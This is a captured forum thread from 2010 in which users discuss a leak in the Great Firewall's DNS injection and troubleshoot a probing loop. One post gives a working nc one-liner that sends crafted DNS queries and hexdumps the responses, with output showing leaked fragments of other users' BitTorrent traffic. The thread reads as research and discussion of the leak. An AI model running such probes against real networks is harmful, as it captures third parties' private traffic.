																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_17"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851399" summary="pid851399" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=8395" target="_blank" id="userinfo851399" class="dropmenu" onmouseover="showMenu(this.id)">laoyang</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">尘世中一个迷途小书童</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=8395">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=8395&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_18" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851399" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851399', '话题链接已经复制到剪贴板')">19楼</strong>
													<em onclick="$('postmessage_851399').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851399').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851399').className='t_smallfont'">小</em>												发表于 2010-10-1 10:17&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=8395" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_18"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_18"></div><div id="ad_thread4_18"></div>
						
						
																											<div id="postmessage_851399" class="t_msgfont">为什么我的出来都是u.u.u.u.</div>

							
							
							
							
															<div id="post_rate_div_851399"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851399_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=8395" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851399&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851399)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_18"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851422" summary="pid851422" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo851422" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_19" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851422" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851422', '话题链接已经复制到剪贴板')">20楼</strong>
													<em onclick="$('postmessage_851422').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851422').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851422').className='t_smallfont'">小</em>												发表于 2010-10-1 10:58&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_19"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_19"></div><div id="ad_thread4_19"></div>
						
						
																											<div id="postmessage_851422" class="t_msgfont">1. 墙外nc的目标主机要是墙内的，墙内nc目标主机要是墙内的。<br />
2. 要输出到文件。只要修改<div class="quote"><h5>引用:</h5><blockquote> ; done </blockquote></div>为<div class="quote"><h5>引用:</h5><blockquote> &gt;&gt;filename ; done </blockquote></div>即可. 具体请搜索并参阅&quot;shell 重定向&quot;。<br />
3.输出的内容显然是根据这时间内其截取到的通信而定。</div>

							
							
							
							
															<div id="post_rate_div_851422"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851422_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851422&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851422)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_19"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851431" summary="pid851431" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo851431" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_20" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851431" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851431', '话题链接已经复制到剪贴板')">21楼</strong>
													<em onclick="$('postmessage_851431').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851431').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851431').className='t_smallfont'">小</em>												发表于 2010-10-1 11:15&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_20"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_20"></div><div id="ad_thread4_20"></div>
						
						
																											<div id="postmessage_851431" class="t_msgfont">@gfwrev:<div class="quote"><h5>引用:</h5><blockquote>$SOME_IP: 在国内的随便选一个国外的不在线的ip，反之亦然。&nbsp; &nbsp;&nbsp;&nbsp;11:28 PM Sep 22nd&nbsp;&nbsp;via web&nbsp;&nbsp;</blockquote></div></div>

							
							
							
							
															<div id="post_rate_div_851431"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851431_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851431&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851431)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_20"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851556" summary="pid851556" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=8395" target="_blank" id="userinfo851556" class="dropmenu" onmouseover="showMenu(this.id)">laoyang</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">尘世中一个迷途小书童</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=8395">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=8395&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_21" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851556" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851556', '话题链接已经复制到剪贴板')">22楼</strong>
													<em onclick="$('postmessage_851556').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851556').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851556').className='t_smallfont'">小</em>												发表于 2010-10-1 13:15&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=8395" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_21"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_21"></div><div id="ad_thread4_21"></div>
													<h2>回复 21楼 麦圆 的话题</h2>
						
						
																											<div id="postmessage_851556" class="t_msgfont">不在线的IP是指没有联网的IP？我怎么知道某个IP有没有联网呢？</div>

							
							
							
							
															<div id="post_rate_div_851556"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851556_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=8395" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851556&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851556)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_21"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851569" summary="pid851569" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16455" target="_blank" id="userinfo851569" class="dropmenu" onmouseover="showMenu(this.id)">shiny</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">路过踩一脚</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16455">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16455&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_22" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851569" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851569', '话题链接已经复制到剪贴板')">23楼</strong>
													<em onclick="$('postmessage_851569').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851569').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851569').className='t_smallfont'">小</em>												发表于 2010-10-1 13:29&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16455" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_22"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_22"></div><div id="ad_thread4_22"></div>
						
						
																											<div id="postmessage_851569" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>shelly</i> 于 2010-9-30 22:58 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=851049&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
请教。。怎样看这些乱七八糟的东西阿？<br />
<br />
<img src="http://i53.tinypic.com/2rfc6xl.png" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /> </blockquote></div>Adobe Photoshop…………</div>

							
							
							
							
															<div id="post_rate_div_851569"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851569_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=16455" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851569&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851569)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_22"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851571" summary="pid851571" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo851571" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_23" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851571" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851571', '话题链接已经复制到剪贴板')">24楼</strong>
													<em onclick="$('postmessage_851571').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851571').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851571').className='t_smallfont'">小</em>												发表于 2010-10-1 13:31&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_23"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_23"></div><div id="ad_thread4_23"></div>
						
						
																											<div id="postmessage_851571" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>萧易寒</i> 于 2010-9-30 15:39 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=850494&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
在国外用不了？已经把128.241.91.35换成国内IP了<br />
<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to </blockquote></div>国外溢出的话貌似只能得到一些BT协议流量。HTTP的没见到几个。</div>

							
							
							
							
															<div id="post_rate_div_851571"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851571_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851571&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851571)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_23"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851572" summary="pid851572" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=2476" target="_blank" id="userinfo851572" class="dropmenu" onmouseover="showMenu(this.id)">四不象</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=2476">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=2476&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_24" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851572" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851572', '话题链接已经复制到剪贴板')">25楼</strong>
													<em onclick="$('postmessage_851572').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851572').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851572').className='t_smallfont'">小</em>												发表于 2010-10-1 13:34&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=2476" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_24"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_24"></div><div id="ad_thread4_24"></div>
						
						
																											<div id="postmessage_851572" class="t_msgfont">128.241.91.35 是dns服务器吗？没反应嘛</div>

							
							
							
							
															<div id="post_rate_div_851572"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851572_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=2476" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851572&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851572)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_24"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851894" summary="pid851894" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo851894" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_25" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851894" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851894', '话题链接已经复制到剪贴板')">26楼</strong>
													<em onclick="$('postmessage_851894').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851894').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851894').className='t_smallfont'">小</em>												发表于 2010-10-1 20:16&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_25"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_25"></div><div id="ad_thread4_25"></div>
						
						
																											<div id="postmessage_851894" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>laoyang</i> 于 2010-10-1 13:15 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=851556&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
不在线的IP是指没有联网的IP？我怎么知道某个IP有没有联网呢？ </blockquote></div>在墙外，随便找一个内地ip嘛，很多ip都是无法链接的。</div>

							
							
							
							
															<div id="post_rate_div_851894"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851894_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851894&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851894)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_25"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851895" summary="pid851895" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo851895" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_26" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851895" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851895', '话题链接已经复制到剪贴板')">27楼</strong>
													<em onclick="$('postmessage_851895').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851895').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851895').className='t_smallfont'">小</em>												发表于 2010-10-1 20:18&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_26"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_26"></div><div id="ad_thread4_26"></div>
						
						
																											<div id="postmessage_851895" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>四不象</i> 于 2010-10-1 13:34 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=851572&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
128.241.91.35 是dns服务器吗？没反应嘛 </blockquote></div>墙外米反应就对了。</div>

							
							
							
							
															<div id="post_rate_div_851895"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851895_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851895&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851895)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_26"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid852494" summary="pid852494" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo852494" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_27" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum852494" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid852494', '话题链接已经复制到剪贴板')">28楼</strong>
													<em onclick="$('postmessage_852494').className='t_bigfont'">大</em>							<em onclick="$('postmessage_852494').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_852494').className='t_smallfont'">小</em>												发表于 2010-10-2 12:28&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_27"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_27"></div><div id="ad_thread4_27"></div>
						
						
																											<div id="postmessage_852494" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>麦圆</i> 于 2010-10-1 20:18 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=851895&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
<br />
<br />
墙外米反应就对了。 </blockquote></div>墙是双向工作的。墙外向国内任意一个IP也可以获得溢出数据。但是很难看到HTTP的数据，据我观察基本都是BT协议。<br />
<br />
比如在墙外主机运行这个命令<div class="blockcode"><em onclick="copycode($('code1'));">复制内容到剪贴板</em><h5>代码:</h5><code id="code1"> $ while true; do printf &quot;\0\0\1\0\0\1\0\0\0\0\0\0\6wux.ru\300&quot; | nc -uq1 www.baidu.com 53 | xxd -s20; done<br />
0000014: 56c5 f14b 3930 4142 4344 4546 3132 3334&nbsp;&nbsp;V..K90ABCDEF1234<br />
0000024: 3536 3738 3930 4142 4344 4546 f298 b43c&nbsp;&nbsp;567890ABCDEF...&lt;<br />
0000034: dfcf c98c 8a7d d7b1 4c61 4f60 6208 7225&nbsp;&nbsp;.....}..LaO`b.r%<br />
0000044: 7a66 392f 04e4 c364 974d 902f 7d52 2dfd&nbsp;&nbsp;zf9/...d.M./}R-.<br />
0000054: 2094 54a2 5051 9968 624c d374 8db3 2928&nbsp; &nbsp;.T.PQ.hbL.t..)(<br />
0000064: 5561 5f30 e12a 258f e4a5 d120 da40 d030&nbsp;&nbsp;Ua_0.*%.... .@.0<br />
0000074: 124d 0dc8 399b a1a5 3101 42c7 014a 0909&nbsp;&nbsp;.M..9...1.B..J..<br />
0000084: 6a06 c041 c534 9372 2fa5 c00c 0001 0001&nbsp;&nbsp;j..A.4.r/.......<br />
0000094: 0000 012c 0004 cb62 0741&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;...,...b.A<br />
0000014: eacf d899 02da 469b 8011 99ce 393a 696e&nbsp;&nbsp;......F.....9:in<br />
0000024: 666f 5f68 6173 6832 303a b381 5a08 569e&nbsp;&nbsp;fo_hash20:..Z.V.<br />
0000034: 1489 13af e9ab a232 0c75 4b91 9468 6531&nbsp;&nbsp;.......2.uK..he1<br />
0000044: 3a71 393a 6765 745f 7065 6572 7331 3a74&nbsp;&nbsp;:q9:get_peers1:t<br />
0000054: 383a 3130 3034 3738 3538 313a 7931 3a71&nbsp;&nbsp;8:100478581:y1:q<br />
0000064: 657e 9762 8016 e991 a1c1 aada 3c66 9851&nbsp;&nbsp;e~.b........&lt;f.Q<br />
0000074: d224 bd35 a31f 6e91 ef6e af71 5d8a a692&nbsp;&nbsp;.$.5..n..n.q]...<br />
0000084: d012 4041 fc90 00d2 4277 c00c 0001 0001&nbsp;&nbsp;..@A....Bw......<br />
0000094: 0000 012c 0004 0807 c62d&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;...,.....-</code></div>一样可以看到一些结果。<br />
<br />
info_hash 和 he1:q9:get_peers1:t8:100478581:y1:qe 就是BT协议里的东西 <a href="http://www.bittorrent.org/beps/bep_0005.html" target="_blank">http://www.bittorrent.org/beps/bep_0005.html</a><br />
<br />
[<i> 本帖最后由 id已被绿坝屏蔽 于 2010-10-2 12:31 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_852494"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo852494_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=852494&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 852494)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_27"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid852644" summary="pid852644" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo852644" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_28" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
